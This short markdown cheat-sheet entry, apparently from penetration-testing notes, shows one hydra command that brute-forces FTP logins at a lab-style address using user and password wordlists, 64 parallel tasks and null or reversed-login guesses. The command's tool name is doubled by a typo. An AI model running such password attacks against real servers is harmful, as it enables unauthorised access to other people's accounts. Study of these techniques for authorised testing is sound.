# FTP

### Bruteforce
```bash
# -V verbose: show attempts
# -L path to file containing usernames (one per line)
# -P path to file containing passwords (one per line)
# -e try “n” null password, “s” login as pass and/or “r” reversed login
# -t number of parallel tasks per server
hydrahydra -V -t 64 -e nsr -L smb-users.txt  -P /usr/share/wordlists/dirb/big.txt 10.11.1.1 ftp
```
